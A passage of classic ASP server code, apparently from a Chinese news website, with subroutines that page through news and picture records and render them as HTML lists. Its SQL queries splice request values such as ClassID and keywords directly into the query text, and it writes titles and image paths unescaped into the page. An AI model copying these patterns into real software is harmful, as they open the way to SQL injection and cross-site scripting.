			rs.AbsolutePage = CurrentPage
			count=rs.recordcount
			i=0
		do until rs.eof
		id				=	rs("id")
		NewsTitle	=	rs("NewsTitle")
		PostTime	=	formatdatetime(rs("PostTime"),2)
		subNewsTitle	=	CutStr(NewsTitle,20)
	%>            
								<li><span><%=PostTime%></span><a href="news.asp?id=<%=id%>" target="_blank"><%=NewsTitle%></a></li>
	<%
			i=i+1 
			if i >= rs.PageSize Then exit do 
			rs.movenext
			loop
		end if
	%>
							</ul>
							<div class="pages"> <%call showpage("newlist.asp?id="&classid,count,rs.pagesize,currentpage,true,true,"条信息")%></div>
	<%
	rs.close
	set rs = nothing
end sub
'---------------------显示图片列表----------------------
sub ShowPicList()
	keywords	=	ReplaceBadChar(request("keywords"))
	if keywords<>"" then
		sqlwhere	=	" and NewsTitle like '%"&keywords&"%'"
	end if
	if ClassID<>"" then
		sqlwhere	=	sqlwhere&" and ClassID="&ClassID&""
	end if
	sqlstr = "select id,NewsTitle,PostTime,NewsSPic,NewsBPic from NewsInfo where NewsLock=0 "&sqlwhere&"  order by NewsOrder desc "
	'response.Write(sqlstr)
	set rs=server.CreateObject("adodb.recordset")
	rs.open sqlstr,conn,1,1
		if rs.eof then
			response.Write("<div>暂时没有相关信息!</div>")
		else
			CurrentPage = Request("page")
			if Not IsNumeric(CurrentPage) Then
				CurrentPage = "1"
			end if
			CurrentPage=Cint(CurrentPage)
			rs.PageSize = 12
			If CurrentPage < 1 Then CurrentPage = 1
			If CurrentPage > rs.PageCount Then 
			CurrentPage = rs.PageCount
			end if
			rs.AbsolutePage = CurrentPage
			count=rs.recordcount
			i=0
		do until rs.eof
		id				=	rs("id")
		NewsTitle	=	rs("NewsTitle")
		PostTime	=	formatdatetime(rs("PostTime"),2)
		NewssPic	=	rs("NewssPic")
		NewsBPic	=	rs("NewsBPic")
		subNewsTitle	=	CutStr(NewsTitle,10)
	%> 
  <dl>
    <dt><img alt="<%=NewsTitle%>" src="<%=NewssPic%>" border="0" /></dt>
    <dd><a href="news.asp?id=<%=id%>" target="_blank"><%=NewsTitle%></a></dd>
  </dl>
	<%
			i=i+1 
			if i >= rs.PageSize Then exit do 
			rs.movenext
			loop
		end if
	%>
							<div class="pages"> <%call showpage("newlist.asp?id="&classid,count,rs.pagesize,currentpage,true,true,"条信息")%></div>
	<%
	rs.close
	set rs = nothing
end sub
%>